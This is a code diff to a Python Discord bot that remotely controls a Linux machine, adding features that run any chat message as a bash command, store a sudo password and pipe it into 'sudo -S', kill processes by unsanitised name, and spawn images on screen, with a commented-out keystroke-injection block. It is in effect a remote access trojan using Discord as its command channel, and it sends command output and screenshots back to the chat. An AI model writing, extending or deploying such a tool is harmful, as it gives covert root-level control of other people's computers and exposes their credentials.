@@ -1,7 +1,9 @@
+from logging import root
 import os
 import subprocess
 import asyncio
 import discord
+from pynput.keyboard import Key, Controller
 import sounddevice as sd
 import soundfile as sf
 import requests
@@ -9,6 +11,7 @@ import time
 from dotenv import load_dotenv
 from mss import mss
 import shutil
+
 
 # load env variables from .env file
 load_dotenv()
@@ -23,6 +26,8 @@ clientName = os.uname().nodename
 selectedClient = "None"
 timeout = 1
 command_mode = False
+
+sudo_password = None
 
 print(clientName)
 
@@ -121,7 +126,7 @@ class MyClient(discord.Client):
         await self.change_presence(activity=discord.Game(name="Online, with linux"))
 
     async def on_message(self, message):
-        global command_mode
+        global command_mode, sudo_password
         if message.author == self.user:
             return
         
@@ -149,8 +154,8 @@ class MyClient(discord.Client):
                         "msg - Display a message box (🪟)\n"
                         "lock - Lock the screen (🪟)\n"
                         "key - Send keystrokes (🪟)\n"
-                        "close - Close a process (🪟)\n"
-                        "img - Display an image (🪟)\n"
+                        "close - Close a process (🐧🪟)\n"
+                        "img - Display an image (🐧🪟)\n"
                         "vid - Display a video (🪟)\n"
                         "sound - Play a sound (🪟)\n"
                         "vol - Set the volume (🪟)\n"
@@ -176,7 +181,7 @@ class MyClient(discord.Client):
                 if message.content == 'cancel':
                     self.cancelled = True
                     await message.channel.send('Operation cancelled')
-                    await asyncio.sleep(3)  # Give some time for ongoing operations to check the flag
+                    await asyncio.sleep(10)  # Give some time for ongoing operations to check the flag
                     self.cancelled = False # Reset for future operations
                     return
                 
@@ -290,6 +295,138 @@ class MyClient(discord.Client):
                         print('Screenshots taken')
                     else:
                         await message.channel.send('Incorrect syntax! Usage: scr <number>')
+                
+                """
+                if message.content.startswith('key'):
+                    keyboard = Controller()
+                    await message.channel.send('Please enter the keystrokes you would like to send')
+                    print('Waiting for keystrokes input...')
+                    def check(m):
+                        return m.author == message.author and m.channel == message.channel
+                    msg = await self.wait_for('message', check=check)
+                    time.sleep(1)  # Short delay before sending keystrokes
+                    keyboard.type(msg.content)
+                    print(f'Sent keystrokes: {msg.content}')
+                    await message.channel.send('Keystrokes sent')
+                """
+
+                if message.content == 'close':
+                    os.system('ps aux > tasklist.txt')
+                    await message.channel.send(file=discord.File('tasklist.txt'))
+                    os.remove('tasklist.txt')
+                    await message.channel.send('Please enter the process process name or PID you would like to close')
+                    def check(m):
+                        return m.author == message.author and m.channel == message.channel
+                    msg = await self.wait_for('message', check=check)
+                    await message.channel.send(f'Closing {msg.content}')
+                    os.system(f'pkill {msg.content}')
+
+                if message.content == 'img':
+                    await message.channel.send('Please upload the image you would like to display and state the amount of images you want to open (e.g. "3")')
+                    def check(m):
+                        return m.author == message.author and m.channel == message.channel and m.attachments
+                    msg = await self.wait_for('message', check=check)
+                    attachment = msg.attachments[0]
+                    await attachment.save('temp_image.png')
+                    def show_image():
+                        # KDE / default handler first
+                        kde_commands = [
+                            ["kioclient5", "exec", "./temp_image.png"],
+                            ["kde-open5", "./temp_image.png"],
+                            ["xdg-open", "./temp_image.png"],
+                        ]
+                        for cmd in kde_commands:
+                            try:
+                                result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                                if result.returncode == 0:
+                                    return cmd[0]
+                            except FileNotFoundError:
+                                continue
+                    
+                    for _ in range(int(msg.content.strip().split()[-1])):
+                        show_image()
+                    time.sleep(3)
+                    os.remove('temp_image.png')
+                
+                if message.content.startswith('cmd'):
+                    def check(m):
+                        return m.author == message.author and m.channel == message.channel
+                    msg = message.content.strip().split(' ', 1)
+                    if len(msg) < 2:
+                        await message.channel.send('No command provided. Usage: cmd <your_command>')
+                        return
+                    if msg[1] == 'cmdtoggle':
+                        command_mode = True
+                        await message.channel.send('Command mode enabled, type "cmdtoggle" to disable')
+                    else:
+                        os.system(msg[1])
+                        await message.channel.send(f'Command "{msg[1]}" executed, output was')
+                        #send the output of the command
+                        os.system(f'{msg[1]} > output.txt')
+                        await message.channel.send(file=discord.File('output.txt'))
+                        time.sleep(1)
+                        os.remove('output.txt')
+        else:
+            if message.content == 'cmdtoggle':
+                command_mode = False
+                await message.channel.send('Command mode disabled.')
+
+            elif message.content.startswith('sudopwd'):
+                # Allow user to provide password inline: 'sudopwd <password>'
+                parts = message.content.strip().split(None, 1)
+                if len(parts) > 1:
+                    sudo_password = parts[1].strip()
+                else:
+                    await message.channel.send('Please enter the sudo password to use for commands that require elevated privileges.')
+                    def check(m):
+                        return m.author == message.author and m.channel == message.channel
+                    try:
+                        msg = await self.wait_for('message', check=check, timeout=60)
+                    except asyncio.TimeoutError:
+                        await message.channel.send('Timed out waiting for password input.')
+                        return
+                    sudo_password = msg.content.strip()
+                await message.channel.send('Sudo password set. You can now run commands with sudo by prefixing them with "sudocmd".')
+
+            elif message.content.startswith('sudocmd'):
+                if not sudo_password:
+                    await message.channel.send('Sudo password not set. Please set it using "sudopwd" command.')
+                    return
+                cmd = message.content.strip().split(' ', 1)
+                if len(cmd) < 2:
+                    await message.channel.send('No command provided. Usage: sudocmd <your_command>')
+                    return
+                full_cmd = f'echo {sudo_password} | sudo -S {cmd[1]}'
+                # Execute and capture output to file
+                try:
+                    with open('output.txt', 'w') as out:
+                        subprocess.run(full_cmd, shell=True, stdout=out, stderr=subprocess.STDOUT, executable='/bin/bash')
+                    await message.channel.send(f'Sudo command executed, output:')
+                    await message.channel.send(file=discord.File('output.txt'))
+                except Exception as e:
+                    await message.channel.send(f'Error executing sudo command: {e}')
+                finally:
+                    try:
+                        os.remove('output.txt')
+                    except Exception:
+                        pass
+
+            else:
+                # Run a normal shell command and return output
+                cmd_text = message.content.strip()
+                try:
+                    with open('output.txt', 'w') as out:
+                        subprocess.run(cmd_text, shell=True, stdout=out, stderr=subprocess.STDOUT, executable='/bin/bash')
+                    await message.channel.send(f'Command "{cmd_text}" executed, output:')
+                    await message.channel.send(file=discord.File('output.txt'))
+                except Exception as e:
+                    await message.channel.send(f'Error executing command: {e}')
+                finally:
+                    try:
+                        os.remove('output.txt')
+                    except Exception:
+                        pass
+
 
 
 intents = discord.Intents.default()
